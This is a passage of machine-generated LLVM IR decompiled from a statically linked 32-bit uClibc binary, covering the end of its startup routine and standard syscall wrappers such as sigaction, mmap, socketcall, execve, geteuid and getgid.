  %v1_80542ad = add i32 %v3_80542aa, 4
  store i32 %v1_80542ad, i32* @global_var_80687cc.765, align 4
  %v3_80542b6 = load i32, i32* %arg3, align 4
  %v14_80542b6 = icmp eq i32 %v1_80542ad, %v3_80542b6
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v1_80542bc = icmp eq i1 %v14_80542b6, false
  %v4_80542bc = select i1 %v1_80542bc, i32 %v1_80542ad, i32 %v3_80542aa
  store i32 %v4_80542bc, i32* @global_var_80687cc.765, align 4
  %v2_80542c4 = ptrtoint i32* %stack_var_-136 to i32
  %v3_80542c9 = bitcast i32* %stack_var_-136 to i8*
  %v4_80542c9 = call i32 @__GI_memset(i8* %v3_80542c9, i32 0, i32 120)
  %v0_80542ce = load i32, i32* @global_var_80687cc.765, align 4
  br label %dec_label_pc_80542d6

dec_label_pc_80542d6:                             ; preds = %dec_label_pc_80542d6, %entry
  %v0_80542d6 = phi i32 [ %v1_80542d9, %dec_label_pc_80542d6 ], [ %v0_80542ce, %entry ]
  %v1_80542d6 = inttoptr i32 %v0_80542d6 to i32*
  %v2_80542d6 = load i32, i32* %v1_80542d6, align 4
  %v3_80542d6 = icmp eq i32 %v2_80542d6, 0
  %v1_80542d9 = add i32 %v0_80542d6, 4
  %v1_80542dc = icmp eq i1 %v3_80542d6, false
  br i1 %v1_80542dc, label %dec_label_pc_80542d6, label %dec_label_pc_80542fd.preheader

dec_label_pc_80542fd.preheader:                   ; preds = %dec_label_pc_80542d6
  store i32 %v1_80542d9, i32* @ebx, align 4
  %v1_80542fd1 = inttoptr i32 %v1_80542d9 to i32*
  %v2_80542fd2 = load i32, i32* %v1_80542fd1, align 4
  %v3_80542fd3 = icmp eq i32 %v2_80542fd2, 0
  %v1_805430010 = icmp eq i1 %v3_80542fd3, false
  br i1 %v1_805430010, label %dec_label_pc_80542e2.lr.ph, label %dec_label_pc_8054302

dec_label_pc_80542e2.lr.ph:                       ; preds = %dec_label_pc_80542fd.preheader
  %v3_80542ba = ptrtoint i32* %stack_var_-168 to i32
  %v3_80542ed = add i32 %v3_80542ba, 32
  br label %dec_label_pc_80542e2

dec_label_pc_80542e2:                             ; preds = %dec_label_pc_80542e2.lr.ph, %dec_label_pc_80542fa
  %v1_80542ed = phi i32 [ %v2_80542fd2, %dec_label_pc_80542e2.lr.ph ], [ %v2_80542fd, %dec_label_pc_80542fa ]
  %v0_80542ec = phi i32 [ %v1_80542d9, %dec_label_pc_80542e2.lr.ph ], [ %v1_80542fa, %dec_label_pc_80542fa ]
  %v6_80542e7 = icmp ugt i32 %v1_80542ed, 14
  br i1 %v6_80542e7, label %dec_label_pc_80542fa, label %dec_label_pc_80542e9

dec_label_pc_80542e9:                             ; preds = %dec_label_pc_80542e2
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_80542ec, i32* %stack_var_-168, align 4
  %v2_80542ed = mul i32 %v1_80542ed, 8
  %v4_80542ed = add i32 %v3_80542ed, %v2_80542ed
  %v3_80542f2 = inttoptr i32 %v4_80542ed to i16*
  %v4_80542f2 = call i32 @memcpy(i16* %v3_80542f2, i32 %v0_80542ec, i32 8)
  %v0_80542fa.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80542fa

dec_label_pc_80542fa:                             ; preds = %dec_label_pc_80542e2, %dec_label_pc_80542e9
  %v0_80542fa = phi i32 [ %v0_80542ec, %dec_label_pc_80542e2 ], [ %v0_80542fa.pre, %dec_label_pc_80542e9 ]
  %v1_80542fa = add i32 %v0_80542fa, 8
  store i32 %v1_80542fa, i32* @ebx, align 4
  %v1_80542fd = inttoptr i32 %v1_80542fa to i32*
  %v2_80542fd = load i32, i32* %v1_80542fd, align 4
  %v3_80542fd = icmp eq i32 %v2_80542fd, 0
  %v1_8054300 = icmp eq i1 %v3_80542fd, false
  br i1 %v1_8054300, label %dec_label_pc_80542e2, label %dec_label_pc_8054302

dec_label_pc_8054302:                             ; preds = %dec_label_pc_80542fa, %dec_label_pc_80542fd.preheader
  store i32 %v2_80542c4, i32* @eax, align 4
  %v0_8054306 = call i32 @_dl_aux_init()
  store i32 %v0_8054306, i32* @eax, align 4
  %v0_805430b = call i32 @__GI___uClibc_init()
  %v1_8054319 = icmp eq i32 %tmp24, 0
  %v3_805431b = select i1 %v1_8054319, i32 4096, i32 %tmp24
  %v13_805431e = icmp eq i32 %tmp23, -1
  store i32 %v3_805431b, i32* @global_var_80687d0.694, align 16
  %v1_8054328 = icmp eq i1 %v13_805431e, false
  br i1 %v1_8054328, label %dec_label_pc_8054353, label %dec_label_pc_805432a

dec_label_pc_805432a:                             ; preds = %dec_label_pc_8054302
  %v0_805432a = call i32 @getuid()
  store i32 %v0_805432a, i32* @ebx, align 4
  %v0_8054331 = call i32 @geteuid()
  %v0_8054336 = load i32, i32* @ebx, align 4
  %v12_8054336 = icmp eq i32 %v0_8054336, %v0_8054331
  %v1_8054338 = icmp eq i1 %v12_8054336, false
  br i1 %v1_8054338, label %dec_label_pc_8054369, label %dec_label_pc_805433a

dec_label_pc_805433a:                             ; preds = %dec_label_pc_805432a
  %v0_805433a = call i32 @getgid()
  store i32 %v0_805433a, i32* @ebx, align 4
  %v0_8054341 = call i32 @getegid()
  %v0_8054346 = load i32, i32* @ebx, align 4
  %v12_8054346 = icmp eq i32 %v0_8054346, %v0_8054341
  %v1_8054348 = icmp eq i1 %v12_8054346, false
  br i1 %v1_8054348, label %dec_label_pc_8054369, label %dec_label_pc_805434a.thread

dec_label_pc_805434a.thread:                      ; preds = %dec_label_pc_805433a
  br label %dec_label_pc_8054393

dec_label_pc_8054353:                             ; preds = %dec_label_pc_8054302
  %v15_8054353 = icmp eq i32 %tmp23, %tmp22
  %v1_8054357 = icmp eq i1 %v15_8054353, false
  br i1 %v1_8054357, label %dec_label_pc_8054369, label %dec_label_pc_8054359

dec_label_pc_8054359:                             ; preds = %dec_label_pc_8054353
  br label %dec_label_pc_8054369

dec_label_pc_8054369:                             ; preds = %dec_label_pc_8054359, %dec_label_pc_8054353, %dec_label_pc_805433a, %dec_label_pc_805432a
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054370 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_805437f = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_805438e = call i32 @__check_one_fd()
  br label %dec_label_pc_8054393

dec_label_pc_8054393:                             ; preds = %dec_label_pc_805434a.thread, %dec_label_pc_8054369
  %v0_8054393 = load i32, i32* @edi, align 4
  %v1_8054393 = inttoptr i32 %v0_8054393 to i32*
  %v2_8054393 = load i32, i32* %v1_8054393, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_8054393, i32* inttoptr (i32 134620472 to i32*), align 8
  store i32 %arg5, i32* @global_var_80687d4.769, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), i32 0), label %dec_label_pc_80543b8, label %dec_label_pc_80543c4

dec_label_pc_80543b8:                             ; preds = %dec_label_pc_8054393, %dec_label_pc_80543b8
  %v4_80543b853 = phi i32 [ %v1_80543bf, %dec_label_pc_80543b8 ], [ 0, %dec_label_pc_8054393 ]
  %v5_80543b8 = mul i32 %v4_80543b853, 4
  %v6_80543b8 = add i32 %v5_80543b8, ptrtoint (i32* @global_var_8062000.767 to i32)
  %v7_80543b8 = inttoptr i32 %v6_80543b8 to i32*
  %v8_80543b8 = load i32, i32* %v7_80543b8, align 4
  call void @__pseudo_call(i32 %v8_80543b8)
  %v0_80543bf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80543bf = add i32 %v0_80543bf, 1
  store i32 %v1_80543bf, i32* %ebx.global-to-local, align 4
  %v1_80543c0 = load i32, i32* %esi.global-to-local, align 4
  %v7_80543c0 = icmp ult i32 %v1_80543bf, %v1_80543c0
  br i1 %v7_80543c0, label %dec_label_pc_80543b8, label %dec_label_pc_80543c4

dec_label_pc_80543c4:                             ; preds = %dec_label_pc_80543b8, %dec_label_pc_8054393
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), i32 0), label %dec_label_pc_80543dc, label %dec_label_pc_80543e8

dec_label_pc_80543dc:                             ; preds = %dec_label_pc_80543c4, %dec_label_pc_80543dc
  %v4_80543dc43 = phi i32 [ %v1_80543e3, %dec_label_pc_80543dc ], [ 0, %dec_label_pc_80543c4 ]
  store i32 ptrtoint (i32* @global_var_80543e3.776 to i32), i32* %stack_var_-164, align 4
  %v5_80543dc = mul i32 %v4_80543dc43, 4
  %v6_80543dc = add i32 %v5_80543dc, ptrtoint (i32* @global_var_8062000.767 to i32)
  %v7_80543dc = inttoptr i32 %v6_80543dc to i32*
  %v8_80543dc = load i32, i32* %v7_80543dc, align 4
  call void @__pseudo_call(i32 %v8_80543dc)
  %v0_80543e3 = load i32, i32* @ebx, align 4
  %v1_80543e3 = add i32 %v0_80543e3, 1
  store i32 %v1_80543e3, i32* @ebx, align 4
  %v1_80543e4.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80543e4 = icmp ult i32 %v1_80543e3, %v1_80543e4.pre
  br i1 %v7_80543e4, label %dec_label_pc_80543dc, label %dec_label_pc_80543e8

dec_label_pc_80543e8:                             ; preds = %dec_label_pc_80543dc, %dec_label_pc_80543c4
  %v0_80543f1 = load i32, i32* %stack_var_-164, align 4
  %v1_80543f1 = call i32 @__errno_location(i32 %v0_80543f1)
  %v1_80543f6 = inttoptr i32 %v1_80543f1 to i32*
  store i32 0, i32* %v1_80543f6, align 4
  %v0_8054405 = call i32 @__GI___h_errno_location()
  store i32 %v0_8054405, i32* @eax, align 4
  %v1_805440a = inttoptr i32 %v0_8054405 to i32*
  store i32 0, i32* %v1_805440a, align 4
  %v0_8054410 = load i32, i32* @eax, align 4
  store i32 %v0_8054410, i32* %stack_var_-164, align 4
  %v0_8054411 = load i32, i32* @global_var_80687cc.765, align 4
  store i32 %v0_8054411, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8054273)
  %v0_8054426 = load i32, i32* @eax, align 4
  %v1_8054429 = call i32 @__GI_exit(i32 %v0_8054426)
  %v0_8054435 = load i32, i32* @ebx, align 4
  %v1_8054435 = inttoptr i32 %v0_8054435 to %sigcontext*
  %v2_8054435 = call i32 @sigreturn(%sigcontext* %v1_8054435)
  %v0_805443d = load i32, i32* @ebx, align 4
  %v1_805443d = inttoptr i32 %v0_805443d to %sigcontext*
  %v2_805443d = call i32 @sigreturn(%sigcontext* %v1_805443d)
  ret i32 %v2_805443d

; uselistorder directives
  uselistorder i32 %v1_80543e3, { 1, 2, 0 }
  uselistorder i32 %v1_80543bf, { 1, 2, 0 }
  uselistorder i32 %v2_80542fd, { 1, 0 }
  uselistorder i32 %v1_80542fa, { 2, 1, 0 }
  uselistorder i32 %v1_80542d9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80542d6, { 1, 0 }
  uselistorder i32 %v1_80542ad, { 1, 0, 2 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 2, 3, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_80543dc, { 1, 0 }
  uselistorder label %dec_label_pc_80543b8, { 1, 0 }
  uselistorder label %dec_label_pc_8054393, { 1, 0 }
  uselistorder label %dec_label_pc_80542fa, { 1, 0 }
  uselistorder label %dec_label_pc_80542e2, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805443f = load i32, i32* @esi, align 4
  %v0_8054440 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054455 = icmp eq i32* %arg2, null
  br i1 %v1_8054455, label %dec_label_pc_80544a9, label %dec_label_pc_8054459

dec_label_pc_8054459:                             ; preds = %entry
  %v2_8054459 = load i32, i32* %arg2, align 4
  store i32 %v2_8054459, i32* %stack_var_-148, align 4
  %v1_8054462 = add i32 %tmp11, 4
  %v3_8054474 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054474 = call i32 @memcpy(i16* %v3_8054474, i32 %v1_8054462, i32 128)
  br label %dec_label_pc_80544a9

dec_label_pc_80544a9:                             ; preds = %entry, %dec_label_pc_8054459
  %v1_80544ab = icmp eq i32 %arg3, 0
  br i1 %v1_80544ab, label %dec_label_pc_80544b3, label %dec_label_pc_80544af

dec_label_pc_80544af:                             ; preds = %dec_label_pc_80544a9
  %v2_80544af = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_80544b3

dec_label_pc_80544b3:                             ; preds = %dec_label_pc_80544a9, %dec_label_pc_80544af
  %v0_80544c2 = phi i32 [ 0, %dec_label_pc_80544a9 ], [ %v2_80544af, %dec_label_pc_80544af ]
  br i1 %v1_8054455, label %dec_label_pc_80544c0, label %dec_label_pc_80544b9

dec_label_pc_80544b9:                             ; preds = %dec_label_pc_80544b3
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_80544c0

dec_label_pc_80544c0:                             ; preds = %dec_label_pc_80544b3, %dec_label_pc_80544b9
  %v0_80544c3 = phi %sigaction* [ null, %dec_label_pc_80544b3 ], [ %phitmp, %dec_label_pc_80544b9 ]
  %v5_80544cb = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_80544c3, i32 %v0_80544c2, i32 8)
  store i32 %v5_80544cb, i32* %ebx.global-to-local, align 4
  br i1 %v1_80544ab, label %dec_label_pc_805450e, label %dec_label_pc_80544d9

dec_label_pc_80544d9:                             ; preds = %dec_label_pc_80544c0
  %v2_80544d9 = icmp slt i32 %v5_80544cb, 0
  br i1 %v2_80544d9, label %dec_label_pc_805450e, label %dec_label_pc_80544dd

dec_label_pc_80544dd:                             ; preds = %dec_label_pc_80544d9
  %v3_80544dd = load i32, i32* %stack_var_-288, align 4
  %v2_80544e1 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80544dd, i32* %v2_80544e1, align 4
  %v2_80544e9 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80544ee = add i32 %arg3, 4
  %v3_80544f2 = inttoptr i32 %v1_80544ee to i16*
  %v4_80544f2 = call i32 @memcpy(i16* %v3_80544f2, i32 %v2_80544e9, i32 128)
  %v2_80544fb = add i32 %arg3, 132
  %v3_80544fb = inttoptr i32 %v2_80544fb to i32*
  %v2_8054508 = add i32 %arg3, 136
  %v3_8054508 = inttoptr i32 %v2_8054508 to i32*
  %v0_8054514.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805450e

dec_label_pc_805450e:                             ; preds = %dec_label_pc_80544d9, %dec_label_pc_80544c0, %dec_label_pc_80544dd
  %v0_8054514 = phi i32 [ %v5_80544cb, %dec_label_pc_80544d9 ], [ %v5_80544cb, %dec_label_pc_80544c0 ], [ %v0_8054514.pre, %dec_label_pc_80544dd ]
  store i32 %v0_8054440, i32* @ebx, align 4
  store i32 %v0_805443f, i32* @esi, align 4
  ret i32 %v0_8054514

; uselistorder directives
  uselistorder i1 %v1_80544ab, { 1, 0 }
  uselistorder i1 %v1_8054455, { 1, 0 }
  uselistorder i32* null, { 0, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805450e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80544c0, { 1, 0 }
  uselistorder label %dec_label_pc_80544b3, { 1, 0 }
  uselistorder label %dec_label_pc_80544a9, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_805451f = load i32, i32* @eax, align 4
  %v1_8054521 = sub i32 0, %v0_805451f
  %v1_8054523 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8054528 = inttoptr i32 %v1_8054523 to i32*
  store i32 %v1_8054521, i32* %v2_8054528, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8054534 = load i32, i32* @ebx, align 4
  %v2_805453b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805453b, i32* @ebx, align 4
  %v8_805453f = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8054534, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_805453f, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134563100)
  ret i32 %v8_805453f

; uselistorder directives
  uselistorder i32 %v8_805453f, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134563100, { 1, 0 }
  uselistorder i32 -4096, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054550 = load i32, i32* @ebx, align 4
  store i32 %v0_8054550, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054563 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054563, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8054563, -4095
  br i1 %tmp, label %dec_label_pc_805457c, label %dec_label_pc_8054570

dec_label_pc_8054570:                             ; preds = %entry
  %v0_8054570 = load i32, i32* %stack_var_-4, align 4
  %v1_8054570 = call i32 @__errno_location(i32 %v0_8054570)
  %v0_8054575 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054575 = sub i32 0, %v0_8054575
  %v2_8054577 = inttoptr i32 %v1_8054570 to i32*
  store i32 %v1_8054575, i32* %v2_8054577, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805457c

dec_label_pc_805457c:                             ; preds = %entry, %dec_label_pc_8054570
  %v0_805457d = phi i32 [ %v1_8054563, %entry ], [ -1, %dec_label_pc_8054570 ]
  %v2_805457c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805457c, i32* @edx, align 4
  %v2_8054580 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054580, i32* @ebx, align 4
  ret i32 %v0_805457d

; uselistorder directives
  uselistorder i32 %v1_8054563, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805457c, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054585 = load i32, i32* @esi, align 4
  store i32 %v0_8054585, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8054599 = load i32, i32* @ebx, align 4
  %v7_80545a1 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_80545a1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_80545a1, -4095
  br i1 %tmp, label %dec_label_pc_80545b9, label %dec_label_pc_80545ad

dec_label_pc_80545ad:                             ; preds = %entry
  %v1_80545ad = call i32 @__errno_location(i32 %v0_8054599)
  %v0_80545b2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80545b2 = sub i32 0, %v0_80545b2
  %v2_80545b4 = inttoptr i32 %v1_80545ad to i32*
  store i32 %v1_80545b2, i32* %v2_80545b4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80545b9

dec_label_pc_80545b9:                             ; preds = %entry, %dec_label_pc_80545ad
  %v0_80545ba = phi i32 [ %v7_80545a1, %entry ], [ -1, %dec_label_pc_80545ad ]
  %v2_80545b9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80545b9, i32* @edx, align 4
  %v2_80545bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80545bc, i32* @esi, align 4
  ret i32 %v0_80545ba

; uselistorder directives
  uselistorder i32 %v7_80545a1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80545b9, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80545c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80545c0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80545d3 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80545d3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80545d3, -4095
  br i1 %tmp, label %dec_label_pc_80545ec, label %dec_label_pc_80545e0

dec_label_pc_80545e0:                             ; preds = %entry
  %v0_80545e0 = load i32, i32* %stack_var_-4, align 4
  %v1_80545e0 = call i32 @__errno_location(i32 %v0_80545e0)
  %v0_80545e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80545e5 = sub i32 0, %v0_80545e5
  %v2_80545e7 = inttoptr i32 %v1_80545e0 to i32*
  store i32 %v1_80545e5, i32* %v2_80545e7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80545ec

dec_label_pc_80545ec:                             ; preds = %entry, %dec_label_pc_80545e0
  %v0_80545ed = phi i32 [ %v4_80545d3, %entry ], [ -1, %dec_label_pc_80545e0 ]
  %v2_80545ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80545ec, i32* @edx, align 4
  %v2_80545f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80545f0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80545ed

; uselistorder directives
  uselistorder i32 %v4_80545d3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80545ec, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80545f4 = load i32, i32* @edi, align 4
  store i32 %v0_80545f4, i32* %stack_var_-4, align 4
  %v4_80545f8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80545f8, i32* %edi.global-to-local, align 4
  %v0_8054604 = load i32, i32* @ebx, align 4
  %v5_805460c = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_805460c = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_805460c = call i32 @execve(i8* %arg1, [1 x i8*] %v5_805460c, [1 x i8*] %v8_805460c)
  store i32 %v9_805460c, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_805460c, -4095
  br i1 %tmp12, label %dec_label_pc_8054624, label %dec_label_pc_8054618

dec_label_pc_8054618:                             ; preds = %entry
  %v1_8054618 = call i32 @__errno_location(i32 %v0_8054604)
  %v0_805461d = load i32, i32* %edi.global-to-local, align 4
  %v1_805461d = sub i32 0, %v0_805461d
  %v2_805461f = inttoptr i32 %v1_8054618 to i32*
  store i32 %v1_805461d, i32* %v2_805461f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054624

dec_label_pc_8054624:                             ; preds = %entry, %dec_label_pc_8054618
  %v0_8054625 = phi i32 [ %v9_805460c, %entry ], [ -1, %dec_label_pc_8054618 ]
  %v2_8054624 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054624, i32* @edx, align 4
  %v2_8054628 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054628, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054625

; uselistorder directives
  uselistorder i32 %v9_805460c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054624, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805462c = load i32, i32* @ebx, align 4
  store i32 %v0_805462c, i32* %stack_var_-4, align 4
  %v1_8054635 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054635, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8054635, -4095
  br i1 %tmp, label %dec_label_pc_805464c, label %dec_label_pc_8054640

dec_label_pc_8054640:                             ; preds = %entry
  %v0_8054640 = load i32, i32* %stack_var_-4, align 4
  %v1_8054640 = call i32 @__errno_location(i32 %v0_8054640)
  %v0_8054645 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054645 = sub i32 0, %v0_8054645
  %v2_8054647 = inttoptr i32 %v1_8054640 to i32*
  store i32 %v1_8054645, i32* %v2_8054647, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805464c

dec_label_pc_805464c:                             ; preds = %entry, %dec_label_pc_8054640
  %v0_805464d = phi i32 [ %v1_8054635, %entry ], [ -1, %dec_label_pc_8054640 ]
  %v2_8054650 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054650, i32* @ebx, align 4
  ret i32 %v0_805464d

; uselistorder directives
  uselistorder i32 %v1_8054635, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805464c, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054654 = load i32, i32* @ebx, align 4
  store i32 %v0_8054654, i32* %stack_var_-4, align 4
  %v1_805465d = call i32 @int80_syscall(i32 201)
  store i32 %v1_805465d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805465d, -4095
  br i1 %tmp, label %dec_label_pc_8054674, label %dec_label_pc_8054668

dec_label_pc_8054668:                             ; preds = %entry
  %v0_8054668 = load i32, i32* %stack_var_-4, align 4
  %v1_8054668 = call i32 @__errno_location(i32 %v0_8054668)
  %v0_805466d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805466d = sub i32 0, %v0_805466d
  %v2_805466f = inttoptr i32 %v1_8054668 to i32*
  store i32 %v1_805466d, i32* %v2_805466f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054674

dec_label_pc_8054674:                             ; preds = %entry, %dec_label_pc_8054668
  %v0_8054675 = phi i32 [ %v1_805465d, %entry ], [ -1, %dec_label_pc_8054668 ]
  %v2_8054678 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054678, i32* @ebx, align 4
  ret i32 %v0_8054675

; uselistorder directives
  uselistorder i32 %v1_805465d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054674, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805467c = load i32, i32* @ebx, align 4
  store i32 %v0_805467c, i32* %stack_var_-4, align 4
  %v1_8054685 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8054685, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8054685, -4095
  br i1 %tmp, label %dec_label_pc_805469c, label %dec_label_pc_8054690

dec_label_pc_8054690:                             ; preds = %entry
  %v0_8054690 = load i32, i32* %stack_var_-4, align 4
